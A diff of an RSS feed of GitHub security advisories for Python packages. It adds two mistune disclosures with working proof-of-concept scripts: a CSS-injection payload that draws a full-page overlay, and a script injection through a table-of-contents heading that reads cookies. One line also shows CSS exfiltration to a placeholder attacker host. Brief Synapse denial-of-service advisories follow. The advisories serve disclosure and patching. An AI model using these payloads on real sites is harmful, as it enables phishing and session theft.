@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-05-14T15:34:55.800Z</updated>
+    <updated>2026-05-14T17:23:46.755Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,940 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[mistune] Mistune Image Directive CSS Injection Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-ccfx-mfmx-2fx9</id>
+        <link href="https://github.com/advisories/GHSA-ccfx-mfmx-2fx9"/>
+        <updated>2026-05-14T16:36:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The Image directive plugin validates the <code>:width:</code> and <code>:height:</code> options with a regex compiled as <code>_num_re = re.compile(r"^\d+(?:\.\d*)?")</code>. This pattern is applied via <code>re.match()</code> (which anchors only at the <strong>start</strong> of the string, not the end). Any value that begins with one or more digits passes validation, regardless of what follows.</p>
+<p>When the validated value is not a plain integer, <code>render_block_image()</code> inserts it directly into a <code>style="width:...;"</code> or <code>style="height:...;"</code> attribute. Because the value was accepted by the prefix-only regex, any CSS after the leading digits reaches the <code>style=</code> attribute verbatim and without escaping.</p>
+<p>An attacker can therefore inject an arbitrary chain of CSS properties — including <code>position:fixed</code>, <code>background-color</code>, <code>z-index</code>, <code>outline</code>, and <code>opacity</code> — using nothing more than a single <code>:width:</code> option in a fenced image directive. The resulting element can visually cover the entire browser viewport, enabling full-page phishing overlays and UI redressing attacks.</p>
+<h2 id="details">Details</h2>
+<p><strong>File:</strong> <code>src/mistune/directives/image.py</code></p>
+<pre><code class="language-python">_num_re = re.compile(r"^\d+(?:\.\d*)?")   # no $ anchor — prefix match only
+
+def _parse_attrs(options):
+    height = options.get("height")
+    width  = options.get("width")
+    if height and _num_re.match(height):   # passes if value STARTS with a digit
+        attrs["height"] = height           # full value stored, not just digits
+    if width and _num_re.match(width):     # same — prefix-only check
+        attrs["width"] = width
+</code></pre>
+<p>And in <code>render_block_image()</code>:</p>
+<pre><code class="language-python">if width:
+    if width.isdigit():
+        img += ' width="' + width + '"'   # safe: integer → HTML attribute
+    else:
+        style += "width:" + width + ";"   # UNSAFE: non-integer → raw style value
+</code></pre>
+<p>The <code>isdigit()</code> branch correctly uses an HTML attribute for plain integers. The <code>else</code> branch assumes that anything that passed <code>_num_re.match()</code> is a safe CSS length like <code>100px</code> or <code>50%</code>. However, because the regex is prefix-only, <code>100vw;height:100vh;position:fixed;...</code> also passes, and the entire string lands in <code>style=</code> unmodified.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Step 1 — Establish the baseline (safe plain-integer dimensions)</strong></p>
+<p>The script creates a parser with <code>escape=True</code>, <code>FencedDirective</code>, and the <code>Image</code> plugin. A safe image directive is rendered with integer <code>width</code> and <code>height</code>:</p>
+<pre><code class="language-python">md = create_markdown(escape=True, plugins=[FencedDirective([Image()])])
+
+bl_src = (
+    "```{image} photo.jpg\n"
+    ":width: 400\n"
+    ":height: 300\n"
+    ":alt: safe image\n"
+    "```\n"
+)
+bl_out = str(md(bl_src))
+</code></pre>
+<p>Expected and actual output — clean <code>width=</code> and <code>height=</code> HTML attributes, no <code>style=</code>:</p>
+<pre><code class="language-html">&lt;div class="block-image"&gt;&lt;img src="photo.jpg" alt="safe image" width="400" height="300" /&gt;&lt;/div&gt;
+</code></pre>
+<p><strong>Step 2 — Understand why non-integer widths go into <code>style=</code></strong></p>
+<p>When <code>width</code> is not a plain integer (e.g., <code>100px</code>), <code>width.isdigit()</code> returns <code>False</code>, so the render path falls through to <code>style += "width:" + width + ";"</code>. This is the intended mechanism for CSS-unit dimensions. The flaw is that <code>_num_re.match()</code> lets far more than CSS units through.</p>
+<p><strong>Step 3 — Craft the exploit payload</strong></p>
+<p>Provide a <code>:width:</code> value that begins with a valid number (satisfying <code>_num_re.match()</code>) but appends an entire CSS attack chain after it:</p>
+<pre><code>:width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93
+</code></pre>
+<ul>
+<li><code>100vw</code> — starts with <code>1</code>, passes <code>_num_re.match()</code>; also sets the width to full viewport width</li>
+<li><code>;height:100vh</code> — overrides height to full viewport height</li>
+<li><code>;position:fixed</code> — lifts element out of document flow, fixed to the browser viewport</li>
+<li><code>;top:0;left:0</code> — anchors overlay to the top-left corner</li>
+<li><code>;z-index:9999</code> — places it above all other page content</li>
+<li><code>;background-color:#e11d48</code> — fills the overlay with vivid crimson</li>
+<li><code>;outline:8px solid #facc15</code> — adds a bright yellow border</li>
+<li><code>;color:#fff;opacity:.93</code> — styles the alt-text label in white with near-full opacity</li>
+</ul>
+<p>Full exploit markdown:</p>
+<pre><code>```{image} x.jpg
+:width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93
+:alt: ⚠ CSS INJECTED — click to dismiss ⚠
+</code></pre>
+<pre><code>
+**Step 4 — Observe the injected `style=` in the output**
+
+```python
+ex_src = (
+    "```{image} x.jpg\n"
+    ":width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;"
+    "background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\n"
+    ":alt: ⚠ CSS INJECTED — click to dismiss ⚠\n"
+    "```\n"
+)
+ex_out = str(md(ex_src))
+</code></pre>
+<p>Actual output:</p>
+<pre><code class="language-html">&lt;div class="block-image"&gt;&lt;img src="x.jpg" alt="⚠ CSS INJECTED — click to dismiss ⚠" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93;" /&gt;&lt;/div&gt;
+</code></pre>
+<p>Every injected CSS property is present in the <code>style=</code> attribute. When a browser renders this HTML, the <code>&lt;img&gt;</code> element:</p>
+<ul>
+<li>expands to fill 100% of the viewport width and height</li>
+<li>sits fixed at the top-left corner, scrolling with the viewport</li>
+<li>is coloured crimson with a yellow outline</li>
+<li>appears above all other page content</li>
+</ul>
+<p>The result is a complete full-page phishing overlay generated from a single Markdown image directive.</p>
+<h3 id="script">Script</h3>
+<p>I have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""H6: Image directive CSS injection — width/height use prefix-only re.match().
+
+Exploit combines: position:fixed  +  background-color  +  outline colour
+→ a full-viewport coloured overlay injected via a single :width: option.
+"""
+import os, html as h
+from mistune import create_markdown
+from mistune.directives import FencedDirective
+from mistune.directives.image import Image
+
+md = create_markdown(escape=True, plugins=[FencedDirective([Image()])])
+
+# --- baseline ---
+bl_file = "baseline_h6.md"
+bl_src  = (
+    "```{image} photo.jpg\n"
+    ":width: 400\n"
+    ":height: 300\n"
+    ":alt: safe image\n"
+    "```\n"
+)
+with open(os.path.join(os.getcwd(), bl_file), "w") as f:
+    f.write(bl_src)
+bl_out = str(md(bl_src))
+
+print(f"[{bl_file}]\n{bl_src}")
+print("[output — clean width/height attributes, no style injection]")
+print(bl_out)
+
+# --- exploit ---
+# _num_re.match() is prefix-only (no $ anchor), so anything after the leading
+# digits is accepted and written verbatim into style="width:&lt;value&gt;;".
+# This single :width: value smuggles a full CSS attack chain:
+#   position:fixed  → overlay sits above the entire page
+#   top/left/width/height → covers 100 % of the viewport
+#   background-color:#e11d48 → vivid crimson fill
+#   outline:8px solid #facc15 → bright yellow border
+#   color:#fff → white alt-text label
+#   z-index:9999 → on top of everything
+ex_file = "exploit_h6.md"
+ex_src  = (
+    "```{image} x.jpg\n"
+    ":width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;"
+    "background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\n"
+    ":alt: ⚠ CSS INJECTED — click to dismiss ⚠\n"
+    "```\n"
+)
+with open(os.path.join(os.getcwd(), ex_file), "w") as f:
+    f.write(ex_src)
+ex_out = str(md(ex_src))
+
+print(f"[{ex_file}]\n{ex_src}")
+print("[output — colour + background-colour + fixed overlay injected into style=]")
+print(ex_out)
+
+# --- HTML report ---
+CSS = """
+body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
+h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
+p.desc{color:#555;font-size:.9em;margin-top:6px}
+.warn{background:#fffbeb;border:1px solid #fbbf24;border-radius:6px;padding:10px 16px;
+      font-size:.85em;color:#92400e;margin:12px 0}
+.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;
+      box-shadow:0 1px 4px rgba(0,0,0,.1)}
+.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
+.baseline .case-header{background:#d1fae5;color:#065f46}
+.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
+.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
+.panel{padding:16px}
+.panel+.panel{border-left:1px solid #eee}
+.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
+pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;
+    font-size:.78em;white-space:pre-wrap;word-break:break-all}
+.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
+.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;
+          background:#fff;font-size:.9em;position:relative;overflow:hidden;height:180px}
+/* scope the live-render sandbox so position:fixed stays inside the box */
+.sandbox{position:relative;width:100%;height:100%}
+.sandbox img{max-width:100%;max-height:100%;object-fit:contain}
+/* override position:fixed on exploit img to keep it inside the preview box */
+.sandbox img[style*="position:fixed"]{position:absolute!important;width:100%!important;
+  height:100%!important;top:0!important;left:0!important}
+"""
+
+def case(kind, label, filename, src, out):
+    header = "BASELINE" if kind == "baseline" else "EXPLOIT"
+    sandbox = f'&lt;div class="sandbox"&gt;{out}&lt;/div&gt;'
+    return f"""
+&lt;div class="case {kind}"&gt;
+  &lt;div class="case-header"&gt;{header} — {h.escape(label)}&lt;/div&gt;
+  &lt;div class="panels"&gt;
+    &lt;div class="panel"&gt;
+      &lt;h3&gt;Input — {h.escape(filename)}&lt;/h3&gt;
+      &lt;pre&gt;{h.escape(src)}&lt;/pre&gt;
+    &lt;/div&gt;
+    &lt;div class="panel"&gt;
+      &lt;h3&gt;Output — HTML source&lt;/h3&gt;
+      &lt;pre&gt;{h.escape(out)}&lt;/pre&gt;
+      &lt;div class="rlabel"&gt;↓ live render (sandboxed to preview box)&lt;/div&gt;
+      &lt;div class="rendered"&gt;{sandbox}&lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;"""
+
+page = f"""&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;H6 — Image CSS Injection&lt;/title&gt;&lt;style&gt;{CSS}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;H6 — Image Directive CSS Injection&lt;/h1&gt;
+&lt;p class="desc"&gt;
+  &lt;code&gt;_parse_attrs()&lt;/code&gt; in &lt;code&gt;directives/image.py&lt;/code&gt; validates
+  &lt;code&gt;:width:&lt;/code&gt; / &lt;code&gt;:height:&lt;/code&gt; with &lt;code&gt;_num_re.match()&lt;/code&gt;
+  (prefix-only — no &lt;code&gt;$&lt;/code&gt; anchor). Anything after the leading digits
+  is accepted verbatim and written straight into a &lt;code&gt;style=&lt;/code&gt; attribute.
+  A single &lt;code&gt;:width:&lt;/code&gt; option is sufficient to smuggle an arbitrary
+  CSS chain: &lt;strong&gt;position:fixed · background-color · outline colour · full-viewport overlay&lt;/strong&gt;.
+&lt;/p&gt;
+&lt;div class="warn"&gt;
+  ⚠ The EXPLOIT preview below is sandboxed inside its box.
+  In a real document the crimson overlay would cover the &lt;em&gt;entire browser window&lt;/em&gt;.
+&lt;/div&gt;
+{case("baseline",
+      "Integer dims → clean width/height= attributes, no style=",
+      bl_file, bl_src, bl_out)}
+{case("exploit",
+      ":width: carries position:fixed + background-color + outline → full-viewport coloured overlay",
+      ex_file, ex_src, ex_out)}
+&lt;/body&gt;&lt;/html&gt;"""
+
+out_path = os.path.join(os.getcwd(), "report_h6.html")
+with open(out_path, "w") as f:
+    f.write(page)
+print(f"\n[report] {out_path}")
+</code></pre>
+<p>Example usage:</p>
+<pre><code class="language-bash">python poc.py
+</code></pre>
+<p>Once you run the script, open <code>report_h6.html</code> in the browser and observe the behaviour.</p>
+<h2 id="impact">Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Dimension</th>
+<th>Assessment</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Confidentiality</strong></td>
+<td>CSS-based data exfiltration via <code>background-image: url(https://attacker.com/?leak=...)</code> is possible in some browser/CSP configurations</td>
+</tr>
+<tr>
+<td><strong>Integrity</strong></td>
+<td>Full-viewport overlay enables complete UI replacement: phishing login forms, fake alerts, click-jacking, brand impersonation</td>
+</tr>
+<tr>
+<td><strong>Availability</strong></td>
+<td>The overlay obscures all page content from the user until dismissed or navigated away</td>
+</tr>
+</tbody></table>
+<p><strong>Real-world impact scenario:</strong> An attacker posts a Markdown document to a platform (wiki, issue tracker, documentation site) that renders mistune with the Image directive. Any user who views the page sees a full-screen crimson overlay matching the attacker's design, replacing or concealing the legitimate page content. The overlay can contain a convincing login prompt, survey form, or urgent warning designed to capture credentials.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-ccfx-mfmx-2fx9">https://github.com/lepture/mistune/security/advisories/GHSA-ccfx-mfmx-2fx9</a></li>
+<li><a href="https://github.com/lepture/mistune/releases/tag/v3.2.1">https://github.com/lepture/mistune/releases/tag/v3.2.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-ccfx-mfmx-2fx9">https://github.com/advisories/GHSA-ccfx-mfmx-2fx9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-ccfx-mfmx-2fx9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-14T16:36:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mistune] Mistune TOC Anchor Injection XSS]]></title>
+        <id>https://github.com/advisories/GHSA-6269-cqxg-mhhv</id>
+        <link href="https://github.com/advisories/GHSA-6269-cqxg-mhhv"/>
+        <updated>2026-05-14T16:36:12.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>render_toc_ul()</code> builds a <code>&lt;ul&gt;</code> table-of-contents tree from a list of <code>(level, id, text)</code> tuples. Both the <code>id</code> value (used as <code>href="#&lt;id&gt;"</code>) and the <code>text</code> value (used as the visible link label) are inserted into <code>&lt;a&gt;</code> tags via a plain Python format string — with no HTML escaping applied to either value.</p>
+<p>When heading IDs are derived from user-supplied heading text (the standard use-case for readable slug anchors), an attacker can craft a heading whose text breaks out of the <code>href="#..."</code> attribute context, injecting arbitrary HTML tags including <code>&lt;script&gt;</code> blocks directly into the rendered TOC.</p>
+<p>This vulnerability is closely related to H2 (unescaped <code>id=</code> in <code>heading()</code>): the same <code>heading_id</code> callback pattern that triggers H2 also populates the <code>toc_items</code> list that <code>render_toc_ul()</code> consumes, meaning both vulnerabilities fire simultaneously in a typical documentation setup.</p>
+<h2 id="details">Details</h2>
+<p><strong>File:</strong> <code>src/mistune/toc.py</code></p>
+<pre><code class="language-python">def render_toc_ul(toc):
+    ...
+    for level, k, text in toc:
+        # k   = heading id  (used verbatim as href fragment)
+        # text = heading text (used verbatim as link label)
+        item = '&lt;a href="#{}"&gt;{}&lt;/a&gt;'.format(k, text)
+        # Neither k nor text is passed through escape() at any point
+</code></pre>
+<p>The <code>k</code> and <code>text</code> values come directly from the <code>toc_items</code> list accumulated during parsing. If <code>k</code> contains <code>"</code> or <code>&gt;</code>, the <code>href</code> attribute is broken. If <code>text</code> contains <code>&lt;</code>, raw tags are injected as the visible link content.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Step 1 — Establish the baseline (safe default IDs)</strong></p>
+<p>The script creates a parser with <code>escape=True</code> and the default <code>add_toc_hook()</code> (no custom callback). The default hook assigns sequential numeric IDs that never contain user text:</p>
+<pre><code class="language-python">md_safe = create_markdown(escape=True)
+add_toc_hook(md_safe)
+
+bl_src = "# Introduction\n\n## Installation\n"
+_, state = md_safe.parse(bl_src)
+bl_out = render_toc_ul(state.env.get("toc_items", []))
+</code></pre>
+<p>Output — clean, safe TOC:</p>
+<pre><code class="language-html">&lt;ul&gt;
+&lt;li&gt;&lt;a href="#toc_1"&gt;Introduction&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#toc_2"&gt;Installation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</code></pre>
+<p><strong>Step 2 — Enable the vulnerable <code>heading_id</code> callback</strong></p>
+<p>Register a callback that returns the raw heading text as the ID. This is the standard slug-based anchor pattern used by documentation generators:</p>
+<pre><code class="language-python">def raw_id(token, index):
+    return token.get("text", "")
+
+md_vuln = create_markdown(escape=True)
+add_toc_hook(md_vuln, heading_id=raw_id)
+</code></pre>
+<p><strong>Step 3 — Craft the exploit payload</strong></p>
+<p>Construct a heading whose text terminates the <code>href="#..."</code> attribute and injects a <code>&lt;script&gt;</code> block followed by a dangling <code>&lt;a href="</code> to absorb the closing <code>"&gt;</code> that <code>render_toc_ul</code> appends:</p>
+<pre><code>## x"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href="
+</code></pre>
+<p>When <code>raw_id</code> processes this heading, it returns the entire text as the ID: <code>x"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href="</code>.</p>
+<p><strong>Step 4 — Observe script injection in the TOC output</strong></p>
+<pre><code class="language-python">ex_src = '## x"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href="\n'
+_, state = md_vuln.parse(ex_src)
+ex_out = render_toc_ul(state.env.get("toc_items", []))
+</code></pre>
+<p><code>render_toc_ul()</code> formats the malicious ID directly into the <code>&lt;a href&gt;</code>:</p>
+<pre><code class="language-python">'&lt;a href="#{}"&gt;{}&lt;/a&gt;'.format(k, text)
+# becomes:
+'&lt;a href="#x"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href=""&gt;...&lt;a/&gt;'
+</code></pre>
+<p>Actual output:</p>
+<pre><code class="language-html">&lt;ul&gt;
+&lt;li&gt;&lt;a href="#x"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href=""&gt;x&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;lt;a href=&amp;quot;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</code></pre>
+<p>The <code>&lt;script&gt;</code> block is live in the document. Note that the anchor <em>label</em> (<code>text</code>) is escaped correctly by mistune's inline renderer before it reaches <code>toc_items</code>, but <code>k</code> (the heading ID) is not escaped anywhere.</p>
+<h3 id="script">Script</h3>
+<p>I have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""H4: render_toc_ul() puts raw heading ID into &lt;a href&gt; without escaping."""
+import os, html as h
+from mistune import create_markdown
+from mistune.toc import add_toc_hook, render_toc_ul
+
+def raw_id(token, index):
+    return token.get("text", "")
+
+# --- baseline ---
+md_safe = create_markdown(escape=True)
+add_toc_hook(md_safe)
+
+bl_file = "baseline_h4.md"
+bl_src  = "# Introduction\n\n## Installation\n"
+with open(os.path.join(os.getcwd(), bl_file), "w") as f:
+    f.write(bl_src)
+_, state = md_safe.parse(bl_src)
+bl_out = render_toc_ul(state.env.get("toc_items", []))
+
+print(f"[{bl_file}]\n{bl_src}")
+print("[toc output — safe]")
+print(bl_out)
+
+# --- exploit ---
+md_vuln = create_markdown(escape=True)
+add_toc_hook(md_vuln, heading_id=raw_id)
+
+ex_file = "exploit_h4.md"
+ex_src  = '## x"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href="\n'
+with open(os.path.join(os.getcwd(), ex_file), "w") as f:
+    f.write(ex_src)
+_, state = md_vuln.parse(ex_src)
+ex_out = render_toc_ul(state.env.get("toc_items", []))
+
+print(f"[{ex_file}]\n{ex_src}")
+print("[toc output — script injected via href breakout]")
+print(ex_out)
+
+# --- HTML report ---
+CSS = """
+body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
+h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
+p.desc{color:#555;font-size:.9em;margin-top:6px}
+.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
+.baseline .case-header{background:#d1fae5;color:#065f46}
+.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
+.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
+.panel{padding:16px}
+.panel+.panel{border-left:1px solid #eee}
+.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
+pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}
+.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
+.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}
+"""
+
+def case(kind, label, filename, src, out):
+    return f"""
+&lt;div class="case {kind}"&gt;
+  &lt;div class="case-header"&gt;{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}&lt;/div&gt;
+  &lt;div class="panels"&gt;
+    &lt;div class="panel"&gt;
+      &lt;h3&gt;Input — {h.escape(filename)}&lt;/h3&gt;
+      &lt;pre&gt;{h.escape(src)}&lt;/pre&gt;
+    &lt;/div&gt;
+    &lt;div class="panel"&gt;
+      &lt;h3&gt;TOC output — HTML source&lt;/h3&gt;
+      &lt;pre&gt;{h.escape(out)}&lt;/pre&gt;
+      &lt;div class="rlabel"&gt;↓ rendered in browser&lt;/div&gt;
+      &lt;div class="rendered"&gt;{out}&lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;"""
+
+page = f"""&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;H4 — TOC XSS&lt;/title&gt;&lt;style&gt;{CSS}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;H4 — TOC render_toc_ul() XSS&lt;/h1&gt;
+&lt;p class="desc"&gt;render_toc_ul() in toc.py uses '&amp;lt;a href="#{{}}"&amp;gt;{{}}&amp;lt;/a&amp;gt;'.format(k, text) —
+neither k (the heading ID) nor text is escaped before insertion.&lt;/p&gt;
+{case("baseline", "Normal headings → sequential IDs → clean TOC links", bl_file, bl_src, bl_out)}
+{case("exploit",  "Malicious heading ID breaks out of href='#...' → script injected", ex_file, ex_src, ex_out)}
+&lt;/body&gt;&lt;/html&gt;"""
+
+out_path = os.path.join(os.getcwd(), "report_h4.html")
+with open(out_path, "w") as f:
+    f.write(page)
+print(f"\n[report] {out_path}")
+</code></pre>
+<p>Example usage:</p>
+<pre><code class="language-bash">python poc.py
+</code></pre>
+<p>Once you run the script, open <code>report_h4.html</code> in the browser and observe the behaviour.</p>
+<h2 id="impact">Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Dimension</th>
+<th>Assessment</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Confidentiality</strong></td>
+<td>JavaScript execution; attacker can exfiltrate session cookies and any data accessible from the page's origin</td>
+</tr>
+<tr>
+<td><strong>Integrity</strong></td>
+<td>Arbitrary DOM manipulation, phishing form injection, forced redirects</td>
+</tr>
+<tr>
+<td><strong>Availability</strong></td>
+<td>Page crash or freeze available as secondary effect</td>
+</tr>
+</tbody></table>
+<p><strong>Risk context:</strong> TOC generation is a rendering step that often happens in a different template layer from the main body render, potentially reviewed separately and trusted implicitly. Vulnerabilities in TOC output are frequently overlooked in code review. Combined with H2, an attacker exploiting this via a single malicious heading simultaneously injects into both the heading element and the TOC anchor.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-6269-cqxg-mhhv">https://github.com/lepture/mistune/security/advisories/GHSA-6269-cqxg-mhhv</a></li>
+<li><a href="https://github.com/lepture/mistune/commit/04880a0">https://github.com/lepture/mistune/commit/04880a0</a></li>
+<li><a href="https://github.com/lepture/mistune/releases/tag/v3.2.1">https://github.com/lepture/mistune/releases/tag/v3.2.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-6269-cqxg-mhhv">https://github.com/advisories/GHSA-6269-cqxg-mhhv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6269-cqxg-mhhv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-14T16:36:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[matrix-synapse] Synapse pagination Denial of Service]]></title>
+        <id>https://github.com/advisories/GHSA-6qf2-7x63-mm6v</id>
+        <link href="https://github.com/advisories/GHSA-6qf2-7x63-mm6v"/>
+        <updated>2026-05-14T16:18:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In federated rooms, malicious homeservers can craft room events in such a way that prevents Synapse from providing full history to paginating clients.</p>
+<p>Clients could therefore fail to display room history.</p>
+<h3 id="patches">Patches</h3>
+<p>Update to Synapse 1.152.1 or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There are no known workarounds for this issue.</p>
+<h3 id="identifiers">Identifiers</h3>
+<ul>
+<li>ELEMENTSEC-2025-1636</li>
+</ul>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@element.io">security at element.io</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/element-hq/synapse/security/advisories/GHSA-6qf2-7x63-mm6v">https://github.com/element-hq/synapse/security/advisories/GHSA-6qf2-7x63-mm6v</a></li>
+<li><a href="https://github.com/advisories/GHSA-6qf2-7x63-mm6v">https://github.com/advisories/GHSA-6qf2-7x63-mm6v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6qf2-7x63-mm6v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-14T16:18:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[matrix-synapse] Synapse CPU starvation (Denial of Service)]]></title>
+        <id>https://github.com/advisories/GHSA-8q93-326v-3m7g</id>
+        <link href="https://github.com/advisories/GHSA-8q93-326v-3m7g"/>
+        <updated>2026-05-14T16:18:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Local authenticated users can cause Synapse to starve other requests of CPU and lead to other requests failing, causing other users to be denied service.</p>
+<p>Homeservers that trust all their local users are not at risk.</p>
+<h3 id="patches">Patches</h3>
+<p>Update to Synapse 1.152.1 or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If Synapse is deployed behind a reverse proxy, the reverse proxy could be configured to limit the rate of user requests,
+preventing or increasing the difficulty of the attack.</p>
+<h3 id="identifiers">Identifiers</h3>
+<ul>
+<li>ELEMENTSEC-2026-1706</li>
+</ul>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@element.io">security at element.io</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/element-hq/synapse/security/advisories/GHSA-8q93-326v-3m7g">https://github.com/element-hq/synapse/security/advisories/GHSA-8q93-326v-3m7g</a></li>
+<li><a href="https://github.com/element-hq/synapse/issues/19394">https://github.com/element-hq/synapse/issues/19394</a></li>
+<li><a href="https://github.com/element-hq/synapse/commit/3f58bc50dfba5768ee43ce48c5e74c25ba0b078a">https://github.com/element-hq/synapse/commit/3f58bc50dfba5768ee43ce48c5e74c25ba0b078a</a></li>
+<li><a href="https://github.com/advisories/GHSA-8q93-326v-3m7g">https://github.com/advisories/GHSA-8q93-326v-3m7g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8q93-326v-3m7g</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-14T16:18:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyzipper] pyzipper has an encryption bypass for small files encrypted using it]]></title>
+        <id>https://github.com/advisories/GHSA-crqm-m339-7m2p</id>
